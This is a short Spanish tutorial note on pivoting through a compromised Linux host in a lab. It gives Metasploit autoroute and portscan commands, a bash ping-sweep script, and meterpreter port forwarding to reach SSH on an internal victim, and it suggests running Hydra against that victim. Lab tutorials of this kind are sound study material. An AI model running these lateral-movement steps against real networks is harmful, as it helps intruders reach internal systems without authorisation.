---
title: "Pivoting Entornos Linux"
layout: "single"
category: "Pivoting"
slug: "pivoting/pivoting-entornos-linux"
date: "2025-09-30"
---

### Metasploit
Teniendo el siguiente laboratorio, queremos llegar a lanzar un escaneo a la máquina windows, previamente comprometiendo y utilizando la máquinas Linux como "puente".

| Int red |  Kali Linux  |        Linux |     Windows |
| :------ | :----------: | -----------: | ----------: |
| Eth0    | 192.168.1.20 | 192.168.1.40 | 10.10.10.30 |
| Eth1    |              |  10.10.10.23 |             |

Partimos de que hemos comprometido la primera máquina (Linux), y tenemos establecida con ella una sesión de *meterpreter*. Si no la tenemos establecida:
![[Metasploit y MsfVenom#Payload sesión meterpreter Linux]]

### 1º - Enrutar trafico
 Ejecutamos el autoroute y le decimos la sesión sobre la que queremos enrutar el tráfico

```bash
use multi/manage/autoroute
set SESSIONS 1
```

### 2º - Identificar la segunda máquina víctima
Crear un mini script que haga un barrido de la red. Este script lo compartimos con la máquina "puente" y lo lanzamos.
```bash
### LOS MÓDULOS DE METASPLOIT DAN BASTANTES ERROES, LO MEJOR ES UN SCRIPT EN BASH QUE HAGA UN BARRIDO DE LA RED

#!/bin/bash
for i in {1..255}; do
timeout 1 bash -c "ping -c 1 10.10.10.$i" >/dev/null
if [$? -eq 0 ]; then
	echo "Máquina 10.10.10.$i En línea"
	fi
	done
```

### 3º - Port Forwarding
Ya tenemos el tráfico enrutado y estariamos listos para comprometer la segunda máquina. Podemos lanzar un breve escaneo para luego ver que puerto haremos *port forwarding*.
```bash
use scanner/portscan/tcp
```

En este caso es diferente que en windows. Teniendo la sesión de meterpreter y la ruta añadida. Hacemos el port forwarding de la siguiente forma.
```bash
## ME QUIERO TRAER EL PUERTO 22 DE LA 2ª VÍCTIMA A MI MÁQUINA KALI LINUX
portfwd add -l 222 -p 22 -r <ip 2ª víctima>
```

Ahora si hago: 
```
ssh usuario@127.0.0.1 -p 222
```
Podría establecer una sesión ssh con la 2ª víctima a través de mi puerto 222 que está *port forwardeado* . También le podríamos lanzar un Hydra o lo que queramos.



